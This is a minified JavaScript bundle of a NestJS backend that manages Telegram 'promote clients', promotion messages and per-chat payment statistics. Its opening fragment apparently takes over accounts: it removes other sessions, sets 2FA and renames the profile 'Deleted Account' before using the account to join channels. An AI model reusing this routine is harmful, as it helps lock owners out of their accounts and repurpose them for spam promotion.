o.removeOtherAuths(),await o.set2fa(),console.log("waiting for setting 2FA"),await(0,d.sleep)(3e4),await o.updateUsername(""),await(0,d.sleep)(3e3),await o.updatePrivacyforDeletedAccount(),await(0,d.sleep)(3e3),await o.updateProfile("Deleted Account","Deleted Account"),await(0,d.sleep)(3e3),await o.deleteProfilePhotos();const i=await o.channelInfo(!0);console.log("Inserting Document");const r={tgId:t.tgId,lastActive:"today",mobile:t.mobile,availableDate:new Date(Date.now()-864e5).toISOString().split("T")[0],channels:i.ids.length};await this.create(r),await this.usersService.update(t.tgId,{twoFA:!0}),console.log("=============Created PromoteClient============="),await this.telegramService.deleteClient(t.mobile),e.pop()}}catch(e){(0,y.parseError)(e),await this.telegramService.deleteClient(t.mobile)}}catch(e){(0,y.parseError)(e),console.error("An error occurred:",e)}await this.telegramService.deleteClient(t.mobile)}setTimeout((()=>{this.joinchannelForPromoteClients()}),12e4)}};t.PromoteClientService=g,t.PromoteClientService=g=i([(0,s.Injectable)(),n(0,(0,c.InjectModel)("promoteClientModule")),n(1,(0,s.Inject)((0,s.forwardRef)((()=>p.TelegramService)))),n(2,(0,s.Inject)((0,s.forwardRef)((()=>u.UsersService)))),n(3,(0,s.Inject)((0,s.forwardRef)((()=>f.ActiveChannelsService)))),n(4,(0,s.Inject)((0,s.forwardRef)((()=>m.ClientService)))),n(5,(0,s.Inject)((0,s.forwardRef)((()=>f.ActiveChannelsService)))),n(6,(0,s.Inject)((0,s.forwardRef)((()=>h.BufferClientService)))),r("design:paramtypes",[l.Model,p.TelegramService,u.UsersService,f.ActiveChannelsService,m.ClientService,a.ChannelsService,h.BufferClientService])],g)},4013:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.PromoteClientSchema=t.PromoteClient=void 0;const n=o(5839);let a=class{};t.PromoteClient=a,i([(0,n.Prop)({required:!0}),r("design:type",String)],a.prototype,"tgId",void 0),i([(0,n.Prop)({required:!0,unique:!0}),r("design:type",String)],a.prototype,"mobile",void 0),i([(0,n.Prop)({required:!0}),r("design:type",String)],a.prototype,"lastActive",void 0),i([(0,n.Prop)({required:!0}),r("design:type",String)],a.prototype,"availableDate",void 0),i([(0,n.Prop)({required:!0,type:Number}),r("design:type",Number)],a.prototype,"channels",void 0),t.PromoteClient=a=i([(0,n.Schema)({collection:"promoteClients",versionKey:!1,autoIndex:!0,timestamps:!0,toJSON:{virtuals:!0,transform:(e,t)=>{delete t._id}}})],a),t.PromoteClientSchema=n.SchemaFactory.createForClass(a)},4966:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},n=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.PromoteMsgsController=void 0;const a=o(3563),s=o(9742),c=o(9199);let l=class{constructor(e){this.promoteMsgsService=e}async findOne(){return this.promoteMsgsService.findOne()}async update(e){return this.promoteMsgsService.update(e)}};t.PromoteMsgsController=l,i([(0,a.Get)(),(0,s.ApiOperation)({summary:"Get promote-msgs data"}),r("design:type",Function),r("design:paramtypes",[]),r("design:returntype",Promise)],l.prototype,"findOne",null),i([(0,a.Patch)(),(0,s.ApiOperation)({summary:"Update promote-msgs"}),(0,s.ApiBody)({type:Object}),n(0,(0,a.Body)()),r("design:type",Function),r("design:paramtypes",[Object]),r("design:returntype",Promise)],l.prototype,"update",null),t.PromoteMsgsController=l=i([(0,s.ApiTags)("Promote-msgs"),(0,a.Controller)("promote-msgs"),r("design:paramtypes",[c.PromoteMsgsService])],l)},5014:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.PromoteMsgModule=void 0;const r=o(3563),n=o(5839),a=o(9199),s=o(4966),c=o(8213);let l=class{};t.PromoteMsgModule=l,t.PromoteMsgModule=l=i([(0,r.Global)(),(0,r.Module)({imports:[l,n.MongooseModule.forFeature([{name:"promotemsgModule",collection:"promoteMsgs",schema:c.PromoteMsgSchema}])],providers:[a.PromoteMsgsService],controllers:[s.PromoteMsgsController],exports:[a.PromoteMsgsService]})],l)},8213:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__importDefault||function(e){return e&&e.__esModule?e:{default:e}};Object.defineProperty(t,"__esModule",{value:!0}),t.PromoteMsgSchema=t.PromoteMsg=void 0;const n=o(5839),a=r(o(6037));let s=class{};t.PromoteMsg=s,t.PromoteMsg=s=i([(0,n.Schema)({versionKey:!1,autoIndex:!0,strict:!1,timestamps:!0,toJSON:{virtuals:!0,transform:(e,t)=>{delete t._id}}})],s),t.PromoteMsgSchema=n.SchemaFactory.createForClass(s),t.PromoteMsgSchema.add({type:a.default.Schema.Types.Mixed})},9199:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},n=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.PromoteMsgsService=void 0;const a=o(3563),s=o(5839),c=o(6037);let l=class{constructor(e){this.promotemsgModel=e}async OnModuleInit(){console.log("Config Module Inited")}async findOne(){const e=(await this.promotemsgModel.findOne({},{_id:0}).exec())?.toJSON();if(!e)throw new a.NotFoundException("promotemsgModel not found");return e}async update(e){delete e._id;const t=await this.promotemsgModel.findOneAndUpdate({},{$set:{...e}},{new:!0,upsert:!0}).exec();if(!t)throw new a.NotFoundException("promotemsgModel not found");return t}};t.PromoteMsgsService=l,t.PromoteMsgsService=l=i([(0,a.Injectable)(),n(0,(0,s.InjectModel)("promotemsgModule")),r("design:paramtypes",[c.Model])],l)},5639:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.CreatePromoteStatDto=void 0;const n=o(9742);class a{}t.CreatePromoteStatDto=a,i([(0,n.ApiProperty)({example:"shruthi1",description:"Client ID"}),r("design:type",String)],a.prototype,"client",void 0),i([(0,n.ApiProperty)({example:{Girls_Chating_Group_07:4,girls_friends_chatting_group_01:14},description:"Data"}),r("design:type",Map)],a.prototype,"data",void 0),i([(0,n.ApiProperty)({example:552,description:"Total Count"}),r("design:type",Number)],a.prototype,"totalCount",void 0),i([(0,n.ApiProperty)({example:314,description:"Unique Channels"}),r("design:type",Number)],a.prototype,"uniqueChannels",void 0),i([(0,n.ApiProperty)({example:1719929752982,description:"Release Day"}),r("design:type",Number)],a.prototype,"releaseDay",void 0),i([(0,n.ApiProperty)({example:1719860106247,description:"Last Updated TimeStamp"}),r("design:type",Number)],a.prototype,"lastUpdatedTimeStamp",void 0),i([(0,n.ApiProperty)({example:!0,description:"Is Active"}),r("design:type",Boolean)],a.prototype,"isActive",void 0),i([(0,n.ApiProperty)({example:["And_Girls_Boys_Group_Chatting","Girls_Chating_Group_07"],description:"Channels"}),r("design:type",Array)],a.prototype,"channels",void 0)},7108:(e,t,o)=>{Object.defineProperty(t,"__esModule",{value:!0}),t.UpdatePromoteStatDto=void 0;const i=o(9742),r=o(5639);class n extends((0,i.PartialType)(r.CreatePromoteStatDto)){}t.UpdatePromoteStatDto=n},7317:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},n=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.PromoteStatController=void 0;const a=o(3563),s=o(9742),c=o(1630),l=o(5639),p=o(7108);let d=class{constructor(e){this.promoteStatService=e}async create(e){return this.promoteStatService.create(e)}async findByClient(e){return this.promoteStatService.findByClient(e)}async update(e,t){return this.promoteStatService.update(e,t)}async deleteOne(e){return this.promoteStatService.deleteOne(e)}async deleteAll(){return this.promoteStatService.deleteAll()}};t.PromoteStatController=d,i([(0,a.Post)(),n(0,(0,a.Body)()),r("design:type",Function),r("design:paramtypes",[l.CreatePromoteStatDto]),r("design:returntype",Promise)],d.prototype,"create",null),i([(0,a.Get)(":client"),n(0,(0,a.Param)("client")),r("design:type",Function),r("design:paramtypes",[String]),r("design:returntype",Promise)],d.prototype,"findByClient",null),i([(0,a.Put)(":client"),n(0,(0,a.Param)("client")),n(1,(0,a.Body)()),r("design:type",Function),r("design:paramtypes",[String,p.UpdatePromoteStatDto]),r("design:returntype",Promise)],d.prototype,"update",null),i([(0,a.Delete)(":client"),n(0,(0,a.Param)("client")),r("design:type",Function),r("design:paramtypes",[String]),r("design:returntype",Promise)],d.prototype,"deleteOne",null),i([(0,a.Delete)(),r("design:type",Function),r("design:paramtypes",[]),r("design:returntype",Promise)],d.prototype,"deleteAll",null),t.PromoteStatController=d=i([(0,s.ApiTags)("promote-stats"),(0,a.Controller)("promote-stats"),r("design:paramtypes",[c.PromoteStatService])],d)},3085:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.PromoteStatModule=void 0;const r=o(5774),n=o(3563),a=o(5839),s=o(1630),c=o(7317),l=o(937),p=o(8009);let d=class{};t.PromoteStatModule=d,t.PromoteStatModule=d=i([(0,n.Module)({imports:[r.initModule,a.MongooseModule.forFeature([{name:l.PromoteStat.name,collection:"promoteStats",schema:l.PromoteStatSchema}]),p.ClientModule],controllers:[c.PromoteStatController],providers:[s.PromoteStatService],exports:[s.PromoteStatService]})],d)},1630:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},n=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.PromoteStatService=void 0;const a=o(3563),s=o(5839),c=o(6037),l=o(937),p=o(5562);let d=class{constructor(e,t){this.promoteStatModel=e,this.clientService=t}async create(e){return new this.promoteStatModel(e).save()}async findAll(){return await this.promoteStatModel.find().sort({totalCount:-1}).exec()}async findByClient(e){const t=await this.promoteStatModel.findOne({client:e}).exec();if(!t)throw new a.NotFoundException(`PromoteStat not found for client ${e}`);return t}async update(e,t){const o=await this.promoteStatModel.findOneAndUpdate({client:e},t,{new:!0}).exec();if(!o)throw new a.NotFoundException(`PromoteStat not found for client ${e}`);return o}async deleteOne(e){if(0===(await this.promoteStatModel.deleteOne({client:e}).exec()).deletedCount)throw new a.NotFoundException(`PromoteStat not found for client ${e}`)}async deleteAll(){await this.promoteStatModel.deleteMany({}).exec()}async reinitPromoteStats(){const e=await this.findAll();for(const t of e)await this.promoteStatModel.updateOne({client:t.client},{$set:{totalCount:0,uniqueChannels:0,releaseDay:Date.now(),lastUpdatedTimeStamp:Date.now(),data:{}}})}};t.PromoteStatService=d,t.PromoteStatService=d=i([(0,a.Injectable)(),n(0,(0,s.InjectModel)(l.PromoteStat.name)),n(1,(0,a.Inject)((0,a.forwardRef)((()=>p.ClientService)))),r("design:paramtypes",[c.Model,p.ClientService])],d)},937:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.PromoteStatSchema=t.PromoteStat=void 0;const n=o(5839),a=o(9742);let s=class{};t.PromoteStat=s,i([(0,a.ApiProperty)({example:"shruthi1",description:"Client ID"}),(0,n.Prop)({required:!0,unique:!0}),r("design:type",String)],s.prototype,"client",void 0),i([(0,a.ApiProperty)({example:{Girls_Chating_Group_07:4,girls_friends_chatting_group_01:14},description:"Data"}),(0,n.Prop)({required:!0,type:Map,of:Number}),r("design:type",Map)],s.prototype,"data",void 0),i([(0,a.ApiProperty)({example:552,description:"Total Count"}),(0,n.Prop)({required:!0}),r("design:type",Number)],s.prototype,"totalCount",void 0),i([(0,a.ApiProperty)({example:314,description:"Unique Channels"}),(0,n.Prop)({required:!0}),r("design:type",Number)],s.prototype,"uniqueChannels",void 0),i([(0,a.ApiProperty)({example:1719929752982,description:"Release Day"}),(0,n.Prop)({required:!0}),r("design:type",Number)],s.prototype,"releaseDay",void 0),i([(0,a.ApiProperty)({example:!0,description:"Is Active"}),(0,n.Prop)({required:!0}),r("design:type",Boolean)],s.prototype,"isActive",void 0),i([(0,a.ApiProperty)({example:1719929752982,description:"Last Updated TimeStamp"}),(0,n.Prop)({required:!0}),r("design:type",Number)],s.prototype,"lastUpdatedTimeStamp",void 0),i([(0,a.ApiProperty)({example:["And_Girls_Boys_Group_Chatting","Girls_Chating_Group_07"],description:"Channels"}),(0,n.Prop)({required:!0,type:[String]}),r("design:type",Array)],s.prototype,"channels",void 0),t.PromoteStat=s=i([(0,n.Schema)()],s),t.PromoteStatSchema=n.SchemaFactory.createForClass(s)},1415:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.CreateStatDto=void 0;const n=o(9742);class a{}t.CreateStatDto=a,i([(0,n.ApiProperty)({example:"6785668464",description:"Chat ID"}),r("design:type",String)],a.prototype,"chatId",void 0),i([(0,n.ApiProperty)({example:12,description:"Count"}),r("design:type",Number)],a.prototype,"count",void 0),i([(0,n.ApiProperty)({example:50,description:"Pay Amount"}),r("design:type",Number)],a.prototype,"payAmount",void 0),i([(0,n.ApiProperty)({example:!0,description:"Demo Given"}),r("design:type",Boolean)],a.prototype,"demoGiven",void 0),i([(0,n.ApiProperty)({example:!0,description:"Demo Given Today"}),r("design:type",Boolean)],a.prototype,"demoGivenToday",void 0),i([(0,n.ApiProperty)({example:!1,description:"New User"}),r("design:type",Boolean)],a.prototype,"newUser",void 0),i([(0,n.ApiProperty)({example:!0,description:"Paid Reply"}),r("design:type",Boolean)],a.prototype,"paidReply",void 0),i([(0,n.ApiProperty)({example:"Amaan Khan",description:"Name"}),r("design:type",String)],a.prototype,"name",void 0),i([(0,n.ApiProperty)({example:!1,description:"Second Show"}),r("design:type",Boolean)],a.prototype,"secondShow",void 0),i([(0,n.ApiProperty)({example:null,description:"Did Pay"}),r("design:type",Boolean)],a.prototype,"didPay",void 0),i([(0,n.ApiProperty)({example:"shruthi1",description:"Client"}),r("design:type",String)],a.prototype,"client",void 0),i([(0,n.ApiProperty)({example:"shruthi",description:"Profile"}),r("design:type",String)],a.prototype,"profile",void 0)},9531:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},n=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.Stat2Controller=void 0;const a=o(3563),s=o(9742),c=o(8504),l=o(1415),p=o(5986);let d=class{constructor(e){this.statService=e}async create(e){return this.statService.create(e)}async findByChatIdAndProfile(e,t){return this.statService.findByChatIdAndProfile(e,t)}async update(e,t,o){return this.statService.update(e,t,o)}async deleteOne(e,t){return this.statService.deleteOne(e,t)}async deleteAll(){return this.statService.deleteAll()}};t.Stat2Controller=d,i([(0,a.Post)(),n(0,(0,a.Body)()),r("design:type",Function),r("design:paramtypes",[l.CreateStatDto]),r("design:returntype",Promise)],d.prototype,"create",null),i([(0,a.Get)(":chatId/:profile"),n(0,(0,a.Param)("chatId")),n(1,(0,a.Param)("profile")),r("design:type",Function),r("design:paramtypes",[String,String]),r("design:returntype",Promise)],d.prototype,"findByChatIdAndProfile",null),i([(0,a.Put)(":chatId/:profile"),n(0,(0,a.Param)("chatId")),n(1,(0,a.Param)("profile")),n(2,(0,a.Body)()),r("design:type",Function),r("design:paramtypes",[String,String,p.UpdateStatDto]),r("design:returntype",Promise)],d.prototype,"update",null),i([(0,a.Delete)(":chatId/:profile"),n(0,(0,a.Param)("chatId")),n(1,(0,a.Param)("profile")),r("design:type",Function),r("design:paramtypes",[String,String]),r("design:returntype",Promise)],d.prototype,"deleteOne",null),i([(0,a.Delete)(),r("design:type",Function),r("design:paramtypes",[]),r("design:returntype",Promise)],d.prototype,"deleteAll",null),t.Stat2Controller=d=i([(0,s.ApiTags)("stats2"),(0,a.Controller)("stats2"),r("design:paramtypes",[c.Stat2Service])],d)},5471:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.Stat2Module=void 0;const r=o(3563),n=o(5839),a=o(8504),s=o(9531),c=o(4060),l=o(5774);let p=class{};t.Stat2Module=p,t.Stat2Module=p=i([(0,r.Module)({imports:[l.initModule,n.MongooseModule.forFeature([{name:"Stats2Module",collection:"stats2",schema:c.StatSchema}])],controllers:[s.Stat2Controller],providers:[a.Stat2Service],exports:[a.Stat2Service]})],p)},4060:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.StatSchema=t.Stat2=void 0;const n=o(5839),a=o(9742);let s=class{};t.Stat2=s,i([(0,a.ApiProperty)({example:"6785668464",description:"Chat ID"}),(0,n.Prop)({required:!0}),r("design:type",String)],s.prototype,"chatId",void 0),i([(0,a.ApiProperty)({example:12,description:"Count"}),(0,n.Prop)({required:!0}),r("design:type",Number)],s.prototype,"count",void 0),i([(0,a.ApiProperty)({example:50,description:"Pay Amount"}),(0,n.Prop)({required:!0}),r("design:type",Number)],s.prototype,"payAmount",void 0),i([(0,a.ApiProperty)({example:!0,description:"Demo Given"}),(0,n.Prop)({required:!0}),r("design:type",Boolean)],s.prototype,"demoGiven",void 0),i([(0,a.ApiProperty)({example:!0,description:"Demo Given Today"}),(0,n.Prop)({required:!0}),r("design:type",Boolean)],s.prototype,"demoGivenToday",void 0),i([(0,a.ApiProperty)({example:!1,description:"New User"}),(0,n.Prop)({required:!0}),r("design:type",Boolean)],s.prototype,"newUser",void 0),i([(0,a.ApiProperty)({example:!0,description:"Paid Reply"}),(0,n.Prop)({required:!0}),r("design:type",Boolean)],s.prototype,"paidReply",void 0),i([(0,a.ApiProperty)({example:"Amaan Khan",description:"Name"}),(0,n.Prop)({required:!0}),r("design:type",String)],s.prototype,"name",void 0),i([(0,a.ApiProperty)({example:!1,description:"Second Show"}),(0,n.Prop)({required:!0}),r("design:type",Boolean)],s.prototype,"secondShow",void 0),i([(0,a.ApiProperty)({example:null,description:"Did Pay"}),(0,n.Prop)({required:!1}),r("design:type",Boolean)],s.prototype,"didPay",void 0),i([(0,a.ApiProperty)({example:"shruthi1",description:"Client"}),(0,n.Prop)({required:!0}),r("design:type",String)],s.prototype,"client",void 0),i([(0,a.ApiProperty)({example:"shruthi",description:"Profile"}),(0,n.Prop)({required:!0}),r("design:type",String)],s.prototype,"profile",void 0),t.Stat2=s=i([(0,n.Schema)()],s),t.StatSchema=n.SchemaFactory.createForClass(s),t.StatSchema.index({chatId:1,profile:1,client:1},{unique:!0})},8504:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},n=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.Stat2Service=void 0;const a=o(3563),s=o(5839),c=o(6037);let l=class{constructor(e){this.statModel=e}async create(e){return new this.statModel(e).save()}async findByChatIdAndProfile(e,t){const o=await this.statModel.findOne({chatId:e,profile:t}).exec();if(!o)throw new a.NotFoundException(`Stat not found for chatId ${e} and profile ${t}`);return o}async update(e,t,o){const i=await this.statModel.findOneAndUpdate({chatId:e,profile:t},o,{new:!0}).exec();if(!i)throw new a.NotFoundException(`Stat not found for chatId ${e} and profile ${t}`);return i}async findAll(){return await this.statModel.find().exec()}async deleteOne(e,t){if(0===(await this.statModel.deleteOne({chatId:e,profile:t}).exec()).deletedCount)throw new a.NotFoundException(`Stat not found for chatId ${e} and profile ${t}`)}async deleteAll(){await this.statModel.deleteMany({}).exec()}};t.Stat2Service=l,t.Stat2Service=l=i([(0,a.Injectable)(),n(0,(0,s.InjectModel)("Stats2Module")),r("design:paramtypes",[c.Model])],l)},5986:(e,t,o)=>{Object.defineProperty(t,"__esModule",{value:!0}),t.UpdateStatDto=void 0;const i=o(9742),r=o(1415);class n extends((0,i.PartialType)(r.CreateStatDto)){}t.UpdateStatDto=n},3255:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.CreateStatDto=void 0;const n=o(9742);class a{}t.CreateStatDto=a,i([(0,n.ApiProperty)({example:"6785668464",description:"Chat ID"}),r("design:type",String)],a.prototype,"chatId",void 0),i([(0,n.ApiProperty)({example:12,description:"Count"}),r("design:type",Number)],a.prototype,"count",void 0),i([(0,n.ApiProperty)({example:50,description:"Pay Amount"}),r("design:type",Number)],a.prototype,"payAmount",void 0),i([(0,n.ApiProperty)({example:!0,description:"Demo Given"}),r("design:type",Boolean)],a.prototype,"demoGiven",void 0),i([(0,n.ApiProperty)({example:!0,description:"Demo Given Today"}),r("design:type",Boolean)],a.prototype,"demoGivenToday",void 0),i([(0,n.ApiProperty)({example:!1,description:"New User"}),r("design:type",Boolean)],a.prototype,"newUser",void 0),i([(0,n.ApiProperty)({example:!0,description:"Paid Reply"}),r("design:type",Boolean)],a.prototype,"paidReply",void 0),i([(0,n.ApiProperty)({example:"Amaan Khan",description:"Name"}),r("design:type",String)],a.prototype,"name",void 0),i([(0,n.ApiProperty)({example:!1,description:"Second Show"}),r("design:type",Boolean)],a.prototype,"secondShow",void 0),i([(0,n.ApiProperty)({example:null,description:"Did Pay"}),r("design:type",Boolean)],a.prototype,"didPay",void 0),i([(0,n.ApiProperty)({example:"shruthi1",description:"Client"}),r("design:type",String)],a.prototype,"client",void 0),i([(0,n.ApiProperty)({example:"shruthi",description:"Profile"}),r("design:type",String)],a.prototype,"profile",void 0)},8890:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},n=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.StatController=void 0;const a=o(3563),s=o(9742),c=o(2790),l=o(3255),p=o(7180);let d=class{constructor(e){this.statService=e}async create(e){return this.statService.create(e)}async findByChatIdAndProfile(e,t){return this.statService.findByChatIdAndProfile(e,t)}async update(e,t,o){return this.statService.update(e,t,o)}async deleteOne(e,t){return this.statService.deleteOne(e,t)}async deleteAll(){return 